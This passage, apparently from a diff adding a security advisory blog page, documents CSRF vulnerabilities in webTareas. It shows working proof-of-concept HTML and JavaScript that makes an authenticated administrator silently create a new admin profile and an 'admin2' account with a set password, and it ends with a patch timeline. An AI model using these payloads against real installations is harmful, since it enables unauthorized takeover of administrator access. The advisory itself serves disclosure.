+      &lt;input type=&quot;hidden&quot; name=&quot;vals&amp;#91;88&amp;#93;&quot; value=&quot;Y&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;vals&amp;#91;89&amp;#93;&quot; value=&quot;Y&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;vals&amp;#91;90&amp;#93;&quot; value=&quot;Y&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;vals&amp;#91;91&amp;#93;&quot; value=&quot;Y&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;vals&amp;#91;92&amp;#93;&quot; value=&quot;Y&quot; /&gt;
+      &lt;input type=&quot;hidden&quot; name=&quot;Save&quot; value=&quot;Save&quot; /&gt;
+      &lt;input type=&quot;submit&quot; value=&quot;Submit request&quot; /&gt;
+    &lt;/form&gt;
+  &lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+
+<p>Enable the local web server on the attacker machine:</p>
+
+<pre><code>sudo /etc/init.d/apache2 start
+</code></pre>
+
+<p>From an authenticated browser session with administrative privileges, open a new tab and go to the page <a href="http://127.0.0.1/csrf.html">http://127.0.0.1/csrf.html</a>.</p>
+
+<p><img src="/images/f6392ee857fbe8b76700226d8ba46d7d.png" alt="CSRF PoC HTML page" /></p>
+
+<p>Select <strong>Submit request</strong>, to force the administrator to create a new administrator profile named <strong>admin2</strong>.<br />
+The request will be sent to the web application correctly:</p>
+
+<p><img src="/images/28909a3d060e1ec52f13d08ae279dd55.png" alt="CSRF PoC HTTP request sent" /></p>
+
+<p>In the same way, the attacker will send another HTML page requesting the administrator to create a new user, but this time with the new <strong>admin2</strong> profile:</p>
+
+<pre><code>&lt;html&gt;
+  &lt;body&gt;
+  &lt;script&gt;history.pushState('', '', '/')&lt;/script&gt;
+    &lt;script&gt;
+      function submitRequest()
+      {
+        var xhr = new XMLHttpRequest();
+        xhr.open(&quot;POST&quot;, &quot;http:\/\/www.webtareas.net\/users\/edituser.php?&quot;, true);
+        xhr.setRequestHeader(&quot;Accept&quot;, &quot;text\/html,application\/xhtml+xml,application\/xml;q=0.9,image\/webp,*\/*;q=0.8&quot;);
+        xhr.setRequestHeader(&quot;Accept-Language&quot;, &quot;en-US,en;q=0.5&quot;);
+        xhr.setRequestHeader(&quot;Content-Type&quot;, &quot;multipart\/form-data;boundary=---------------------------344591365341958811843854665485&quot;);
+        xhr.withCredentials = true;
+        var body = &quot;-----------------------------344591365341958811843854665485\r\n&quot; + 
+          &quot;Content-Disposition: form-data; name=\&quot;action\&quot;\r\n&quot; + 
+          &quot;\r\n&quot; + 
+          &quot;add\r\n&quot; + 
+          &quot;-----------------------------344591365341958811843854665485\r\n&quot; + 
+          &quot;Content-Disposition: form-data; name=\&quot;un\&quot;\r\n&quot; + 
+          &quot;\r\n&quot; + 
+          &quot;admin2\r\n&quot; + 
+          &quot;-----------------------------344591365341958811843854665485\r\n&quot; + 
+          &quot;Content-Disposition: form-data; name=\&quot;fn\&quot;\r\n&quot; + 
+          &quot;\r\n&quot; + 
+          &quot;admin2\r\n&quot; + 
+          &quot;-----------------------------344591365341958811843854665485\r\n&quot; + 
+          &quot;Content-Disposition: form-data; name=\&quot;gender\&quot;\r\n&quot; + 
+          &quot;\r\n&quot; + 
+          &quot;F\r\n&quot; + 
+          &quot;-----------------------------344591365341958811843854665485\r\n&quot; + 
+          &quot;Content-Disposition: form-data; name=\&quot;perm\&quot;\r\n&quot; + 
+          &quot;\r\n&quot; + 
+          &quot;8\r\n&quot; + 
+          &quot;-----------------------------344591365341958811843854665485\r\n&quot; + 
+          &quot;Content-Disposition: form-data; name=\&quot;dep\&quot;\r\n&quot; + 
+          &quot;\r\n&quot; + 
+          &quot;0\r\n&quot; + 
+          &quot;-----------------------------344591365341958811843854665485\r\n&quot; + 
+          &quot;Content-Disposition: form-data; name=\&quot;tit\&quot;\r\n&quot; + 
+          &quot;\r\n&quot; + 
+          &quot;\r\n&quot; + 
+          &quot;-----------------------------344591365341958811843854665485\r\n&quot; + 
+          &quot;Content-Disposition: form-data; name=\&quot;em\&quot;\r\n&quot; + 
+          &quot;\r\n&quot; + 
+          &quot;\r\n&quot; + 
+          &quot;-----------------------------344591365341958811843854665485\r\n&quot; + 
+          &quot;Content-Disposition: form-data; name=\&quot;em1\&quot;\r\n&quot; + 
+          &quot;\r\n&quot; + 
+          &quot;\r\n&quot; + 
+          &quot;-----------------------------344591365341958811843854665485\r\n&quot; + 
+          &quot;Content-Disposition: form-data; name=\&quot;wp\&quot;\r\n&quot; + 
+          &quot;\r\n&quot; + 
+          &quot;\r\n&quot; + 
+          &quot;-----------------------------344591365341958811843854665485\r\n&quot; + 
+          &quot;Content-Disposition: form-data; name=\&quot;hp\&quot;\r\n&quot; + 
+          &quot;\r\n&quot; + 
+          &quot;\r\n&quot; + 
+          &quot;-----------------------------344591365341958811843854665485\r\n&quot; + 
+          &quot;Content-Disposition: form-data; name=\&quot;mp\&quot;\r\n&quot; + 
+          &quot;\r\n&quot; + 
+          &quot;\r\n&quot; + 
+          &quot;-----------------------------344591365341958811843854665485\r\n&quot; + 
+          &quot;Content-Disposition: form-data; name=\&quot;fax\&quot;\r\n&quot; + 
+          &quot;\r\n&quot; + 
+          &quot;\r\n&quot; + 
+          &quot;-----------------------------344591365341958811843854665485\r\n&quot; + 
+          &quot;Content-Disposition: form-data; name=\&quot;supr\&quot;\r\n&quot; + 
+          &quot;\r\n&quot; + 
+          &quot;0\r\n&quot; + 
+          &quot;-----------------------------344591365341958811843854665485\r\n&quot; + 
+          &quot;Content-Disposition: form-data; name=\&quot;agent\&quot;\r\n&quot; + 
+          &quot;\r\n&quot; + 
+          &quot;0\r\n&quot; + 
+          &quot;-----------------------------344591365341958811843854665485\r\n&quot; + 
+          &quot;Content-Disposition: form-data; name=\&quot;loc\&quot;\r\n&quot; + 
+          &quot;\r\n&quot; + 
+          &quot;0\r\n&quot; + 
+          &quot;-----------------------------344591365341958811843854665485\r\n&quot; + 
+          &quot;Content-Disposition: form-data; name=\&quot;la\&quot;\r\n&quot; + 
+          &quot;\r\n&quot; + 
+          &quot;en\r\n&quot; + 
+          &quot;-----------------------------344591365341958811843854665485\r\n&quot; + 
+          &quot;Content-Disposition: form-data; name=\&quot;dtft\&quot;\r\n&quot; + 
+          &quot;\r\n&quot; + 
+          &quot;\r\n&quot; + 
+          &quot;-----------------------------344591365341958811843854665485\r\n&quot; + 
+          &quot;Content-Disposition: form-data; name=\&quot;tmft\&quot;\r\n&quot; + 
+          &quot;\r\n&quot; + 
+          &quot;\r\n&quot; + 
+          &quot;-----------------------------344591365341958811843854665485\r\n&quot; + 
+          &quot;Content-Disposition: form-data; name=\&quot;wc\&quot;\r\n&quot; + 
+          &quot;\r\n&quot; + 
+          &quot;1\r\n&quot; + 
+          &quot;-----------------------------344591365341958811843854665485\r\n&quot; + 
+          &quot;Content-Disposition: form-data; name=\&quot;bftI\&quot;\r\n&quot; + 
+          &quot;\r\n&quot; + 
+          &quot;2021-09-28\r\n&quot; + 
+          &quot;-----------------------------344591365341958811843854665485\r\n&quot; + 
+          &quot;Content-Disposition: form-data; name=\&quot;ifb\&quot;\r\n&quot; + 
+          &quot;\r\n&quot; + 
+          &quot;0\r\n&quot; + 
+          &quot;-----------------------------344591365341958811843854665485\r\n&quot; + 
+          &quot;Content-Disposition: form-data; name=\&quot;c\&quot;\r\n&quot; + 
+          &quot;\r\n&quot; + 
+          &quot;\r\n&quot; + 
+          &quot;-----------------------------344591365341958811843854665485\r\n&quot; + 
+          &quot;Content-Disposition: form-data; name=\&quot;file1\&quot;; filename=\&quot;\&quot;\r\n&quot; + 
+          &quot;Content-Type: application/octet-stream\r\n&quot; + 
+          &quot;\r\n&quot; + 
+          &quot;\r\n&quot; + 
+          &quot;-----------------------------344591365341958811843854665485\r\n&quot; + 
+          &quot;Content-Disposition: form-data; name=\&quot;attnam1\&quot;\r\n&quot; + 
+          &quot;\r\n&quot; + 
+          &quot;\r\n&quot; + 
+          &quot;-----------------------------344591365341958811843854665485\r\n&quot; + 
+          &quot;Content-Disposition: form-data; name=\&quot;atttmp1\&quot;\r\n&quot; + 
+          &quot;\r\n&quot; + 
+          &quot;\r\n&quot; + 
+          &quot;-----------------------------344591365341958811843854665485\r\n&quot; + 
+          &quot;Content-Disposition: form-data; name=\&quot;act\&quot;\r\n&quot; + 
+          &quot;\r\n&quot; + 
+          &quot;X\r\n&quot; + 
+          &quot;-----------------------------344591365341958811843854665485\r\n&quot; + 
+          &quot;Content-Disposition: form-data; name=\&quot;pw\&quot;\r\n&quot; + 
+          &quot;\r\n&quot; + 
+          &quot;Password1\r\n&quot; + 
+          &quot;-----------------------------344591365341958811843854665485\r\n&quot; + 
+          &quot;Content-Disposition: form-data; name=\&quot;pwa\&quot;\r\n&quot; + 
+          &quot;\r\n&quot; + 
+          &quot;Password1\r\n&quot; + 
+          &quot;-----------------------------344591365341958811843854665485\r\n&quot; + 
+          &quot;Content-Disposition: form-data; name=\&quot;cn\&quot;\r\n&quot; + 
+          &quot;\r\n&quot; + 
+          &quot;\r\n&quot; + 
+          &quot;-----------------------------344591365341958811843854665485\r\n&quot; + 
+          &quot;Content-Disposition: form-data; name=\&quot;pass1\&quot;\r\n&quot; + 
+          &quot;\r\n&quot; + 
+          &quot;Y\r\n&quot; + 
+          &quot;-----------------------------344591365341958811843854665485\r\n&quot; + 
+          &quot;Content-Disposition: form-data; name=\&quot;pass2\&quot;\r\n&quot; + 
+          &quot;\r\n&quot; + 
+          &quot;Y\r\n&quot; + 
+          &quot;-----------------------------344591365341958811843854665485\r\n&quot; + 
+          &quot;Content-Disposition: form-data; name=\&quot;txt0\&quot;\r\n&quot; + 
+          &quot;\r\n&quot; + 
+          &quot;Type new password\r\n&quot; + 
+          &quot;-----------------------------344591365341958811843854665485\r\n&quot; + 
+          &quot;Content-Disposition: form-data; name=\&quot;txt1\&quot;\r\n&quot; + 
+          &quot;\r\n&quot; + 
+          &quot;Need more characters\r\n&quot; + 
+          &quot;-----------------------------344591365341958811843854665485\r\n&quot; + 
+          &quot;Content-Disposition: form-data; name=\&quot;txt2\&quot;\r\n&quot; + 
+          &quot;\r\n&quot; + 
+          &quot;Strength weak\r\n&quot; + 
+          &quot;-----------------------------344591365341958811843854665485\r\n&quot; + 
+          &quot;Content-Disposition: form-data; name=\&quot;txt3\&quot;\r\n&quot; + 
+          &quot;\r\n&quot; + 
+          &quot;Strength medium\r\n&quot; + 
+          &quot;-----------------------------344591365341958811843854665485\r\n&quot; + 
+          &quot;Content-Disposition: form-data; name=\&quot;txt4\&quot;\r\n&quot; + 
+          &quot;\r\n&quot; + 
+          &quot;Strength strong\r\n&quot; + 
+          &quot;-----------------------------344591365341958811843854665485\r\n&quot; + 
+          &quot;Content-Disposition: form-data; name=\&quot;txt5\&quot;\r\n&quot; + 
+          &quot;\r\n&quot; + 
+          &quot;Two new passwords did not match\r\n&quot; + 
+          &quot;-----------------------------344591365341958811843854665485\r\n&quot; + 
+          &quot;Content-Disposition: form-data; name=\&quot;Save\&quot;\r\n&quot; + 
+          &quot;\r\n&quot; + 
+          &quot;Save\r\n&quot; + 
+          &quot;-----------------------------344591365341958811843854665485--\r\n&quot;;
+        var aBody = new Uint8Array(body.length);
+        for (var i = 0; i &lt; aBody.length; i++)
+          aBody[i] = body.charCodeAt(i); 
+        xhr.send(new Blob([aBody]));
+      }
+    &lt;/script&gt;
+    &lt;form action=&quot;#&quot;&gt;
+      &lt;input type=&quot;button&quot; value=&quot;Submit request&quot; onclick=&quot;submitRequest();&quot; /&gt;
+    &lt;/form&gt;
+  &lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+
+<p>Select <strong>Submit request</strong>, to force the administrator to create a new administrator user named <strong>admin2</strong> with a pre-chosen password.<br />
+The request will be sent to the web application correctly:</p>
+
+<p><img src="/images/31406f1c158e8de42cdc48d5763c3eb8.png" alt="CSRF PoC HTTP request sent" /></p>
+
+<p><strong>Security Impact</strong></p>
+
+<p>By exploiting this issue, a remote attacker is able to add an administrator user profile and user account on behalf of a regular platform administrator.</p>
+
+<h2 id="timeline">Timeline</h2>
+
+<ul>
+<li><strong>29/09/2021</strong>: First disclosure via SourceForge ticket, in private mode. Same day the owner take charge of it.</li>
+<li><strong>01/10/2021</strong>: First patch release (2.4p1), and the advisory is published on this blog <a href="https://sourceforge.net/p/webtareas/blog/2021/10/announcement-webtareas-v24p1-release---2021-10-1/">page</a>.</li>
+<li><strong>02/10/2021</strong>: I checked the same issues and suggested IMHO few better fixes.</li>
+<li><strong>07/10/2021</strong>: Second patch release (2.4p2), and the advisory is publishedon this blog <a href="https://sourceforge.net/p/webtareas/blog/2021/10/announcement-webtareas-v24p2-release---2021-10-7/">page</a>.</li>
+</ul>
+
+
+</article>
+
+
+<section class="post-nav">
+    <ul>
+        
+        <li>
+            <a href="https://n4nj0.github.io/advisories/wowza-streaming-engine-i/"><i class="fa fa-chevron-circle-left"></i> Wowza Streaming Engine - Multiple Vulnerabilities</a>
+        </li>
+        
+        
+    </ul>
+</section>
+  
+    
+    
+  
+
+
+
+
+
+<footer>
+  <div>
+    <p>
+      <h6>
+      &copy; 2020 Veno Eivazian.
+      <a href="https://creativecommons.org/licenses/by/3.0/" title="Creative Commons Attribution">Some rights reserved</a>;
+      please attribute properly and link back.
+      </h6>
+    </p>
+  </div>
+</footer>
+
